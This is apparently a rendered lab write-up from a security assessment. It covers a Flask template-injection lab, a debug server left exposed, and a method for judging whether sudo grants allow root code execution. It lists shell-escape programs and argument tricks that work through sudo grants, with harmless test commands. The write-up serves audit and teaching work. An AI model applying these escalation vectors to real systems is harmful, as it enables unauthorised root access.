+<p><strong>The one piece of carelessness is the developer's own comment at <code>app.py:12</code></strong>, which announces the vulnerability in Spanish: <code># No se aplica ninguna pingusanitización</code>. It is a stopping condition in the exact sense of <code>decision-making.md</code> §7 — a confident annotation that ends the derivation. A learner reads it, skips the source, and sends a payload found in a cheat sheet, and never learns the one thing this lab is actually built to teach: that <code>render_template_string</code> on an f-string is the whole bug and its two-line alternative is the whole fix.</p>
+<p><strong>The interesting defect is not the vulnerability, it is <code>debug=True</code> on <code>0.0.0.0</code>.</strong> The author disabled sanitisation deliberately and labelled it; nobody labelled the development server. That oversight is what produced Finding 3, which is a <em>stronger</em> result than the advertised one — it is unauthenticated RCE that survives a correct fix to act one, and it leaks its own PIN to any anonymous client on request. <strong>A lab that teaches one class accidentally ships a second.</strong></p>
+<p><strong>For the author:</strong> drop <code>debug=True</code> (or gate it on an environment variable that is off in the image) and remove or annotate the comment. The first makes the lab teach one thing instead of two; the second turns act one back into a puzzle.</p>
+<hr />
+<h2 id="10-the-criterion-an-inline-grant-versus-a-grant-that-restricts-arguments">10. The criterion: an inline grant versus a grant that restricts arguments</h2>
+<p>This is the transferable content of the lab, and it is the difference between a finding and a no-finding. <code>api_web.md</code> teaches the escalation; this is the part that decides how to <em>report</em> it.</p>
+<p><strong>Step 1 — read the grant's shape from <code>man 5 sudoers</code>, not from memory.</strong> Three forms:</p>
+<table>
+<thead>
+<tr>
+<th>Form</th>
+<th>Example</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>inline</strong></td>
+<td><code>NOPASSWD: /usr/bin/java</code></td>
+<td><em>&quot;A simple file name allows the user to run the command with <strong>any arguments they wish</strong>.&quot;</em> No restriction.</td>
+</tr>
+<tr>
+<td><strong>pinned</strong></td>
+<td><code>NOPASSWD: /usr/bin/java -jar /opt/app/app.jar</code></td>
+<td><em>&quot;the command line has to <strong>match exactly</strong>.&quot;</em> The argument list <strong>is</strong> the mitigation.</td>
+</tr>
+<tr>
+<td><strong>pinned-partial</strong></td>
+<td><code>... -jar /opt/app/*</code> , or a <code>Cmnd_Alias</code> listing several vectors</td>
+<td><code>*</code> matches trailing arguments, and an alias listing several vectors is several ways in. Read as inline.</td>
+</tr>
+</tbody>
+</table>
+<p>Two forms the tooling gives you and the manual documents: the special argument <code>&quot;&quot;</code> means the command may be run <strong>only with no arguments at all</strong>, and <code>*</code> matches any trailing arguments.</p>
+<p><strong>Step 2 — the cheap observable is <code>sudo -n -l</code>, and it costs one request.</strong> A grant that constrains arguments <strong>prints them next to the path</strong>; one that does not <strong>prints the path alone</strong>:</p>
+<pre><code>(ALL) NOPASSWD: /usr/bin/java                            &lt;- inline, any arguments
+(ALL) NOPASSWD: /usr/bin/java -jar /opt/app/app.jar      &lt;- pinned, exact match required
+</code></pre>
+<p>That one line is the entire audit. It is also the only place the <em>audited account's own view</em> of its own privileges exists, so it is the artefact to quote in the report.</p>
+<p><strong>Step 3 — classify the named program, because an argument restriction is a mitigation for one class and worthless for the other.</strong> This is the step almost nobody writes down, and it is the difference between a finding and a no-finding:</p>
+<ul>
+<li><strong>(a) Argument-taking RCE</strong> — <code>java -cp dir Class</code>, <code>python3 -c</code>, <code>perl -e</code>, <code>ruby -e</code>, <code>awk 'BEGIN{…}'</code>, <code>find … -exec /bin/sh -c …</code>, <code>env sh -c</code>. <strong>The payload is an argument.</strong> An exact-argument grant genuinely blocks it. So <em>&quot;the arguments are pinned&quot;</em> is a <strong>defensible argument that this specific line may be a no-finding</strong> — and the follow-up question is always the same: <strong>is the file named in the pinned vector writable by the account?</strong> <code>/opt/app/app.jar</code> owned by <code>pinguinazo</code> turns a pinned grant back into RCE with no change to the policy line. Measure the ownership; never assume it.</li>
+<li><strong>(b) Runtime-spawned shell</strong> — <code>less</code>, <code>more</code>, <code>vi</code>/<code>vim</code>, <code>nano</code>, <code>man</code> (all spawn a pager that honours <code>!</code>), <code>git</code> (<code>core.pager</code>, <code>alias</code>), <code>tar --checkpoint-action=exec</code>, <code>awk</code>'s <code>system()</code>, <code>find -exec</code>, <code>tcpdump -z</code>, <code>nmap --script</code>, <code>gdb -ex</code>. <strong>The shell is spawned after the grant has already been satisfied, so no argument list can prevent it.</strong> A grant of <code>/usr/bin/less /var/log/syslog</code> is exactly as dangerous as an inline one, and the argument restriction buys nothing at all.</li>
+</ul>
+<p><strong>Step 4 — the report states the classification, not just the verdict.</strong> Three outcomes, and the middle one is the one that is usually skipped:</p>
+<table>
+<thead>
+<tr>
+<th>Grant</th>
+<th>Class</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>inline</td>
+<td>(a) argument-taking</td>
+<td><strong>RCE.</strong> Report it as such.</td>
+</tr>
+<tr>
+<td>pinned</td>
+<td>(a) argument-taking</td>
+<td><strong>Conditional</strong> on the pinned file's ownership. Measure it; if root-owned, this line is a <strong>no-finding</strong> and saying so is the valuable output.</td>
+</tr>
+<tr>
+<td>inline <strong>or</strong> pinned</td>
+<td>(b) runtime-spawned</td>
+<td><strong>RCE either way.</strong> The argument list is irrelevant; say so explicitly, or a reviewer will read the pinned vector as a mitigation.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Measured on the class-(a) members in this image, as the unprivileged account, with no grant involved</strong> — the property belongs to the binary, not to the policy, which is why it can be verified without touching the sudoers file:</p>
+<pre><code>perl -e 'print 42+1'                                       -&gt; 43
+python3 -c 'print(42+1)'                                   -&gt; 43
+awk 'BEGIN{print 42+1}'                                    -&gt; 43
+find /etc/hostname -maxdepth 0 -exec /bin/sh -c 'id -un' ; -&gt; pinguinazo
+</code></pre>
+<p><strong>This lab is the first cell of the table: inline + (a) = RCE, and it is root, verified with a positive control that the same class returns <code>uid=1001</code> unprivileged.</strong> The two control refusals (<code>sudo -n /bin/id</code>, <code>sudo -n /usr/bin/id</code>) are what make the report precise rather than alarmist: the policy is tight, and the hole is the <em>choice of program</em>. <strong>That is the sentence the report leads with</strong>, and no amount of payload testing produces it — only reading the line with an argument criterion and classifying the binary does.</p>
+<hr />
+<h2 id="11-restoration">11. Restoration</h2>
+<p>The container was destroyed and recreated from the image and re-verified.</p>
+<pre><code>removed   rc=0
+recreated rc=0
+$ sudo -n /usr/bin/java -version
+openjdk version &quot;21.0.3&quot; 2024-04-16                              &lt;- grant intact, target healthy
+$ nmap -sV -Pn -p- [net-0-19]
+5000/tcp open  http  Werkzeug httpd 3.0.1 (Python 3.12.3)        &lt;- 1 open, 65534 closed
+$ sudo -n -l | tail -1
+    (ALL) NOPASSWD: /usr/bin/java
+</code></pre>
+<p>The only artefacts I created were four files in the world-writable <code>/tmp</code> (<code>P.java</code>, <code>P.class</code>, <code>E.java</code>, <code>E.class</code>) and one derived script; all were inside the container and <strong>all are gone with it</strong>. Nothing outside the container was modified, no image layer was altered, and no <code>cybervault-*</code> container was touched.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
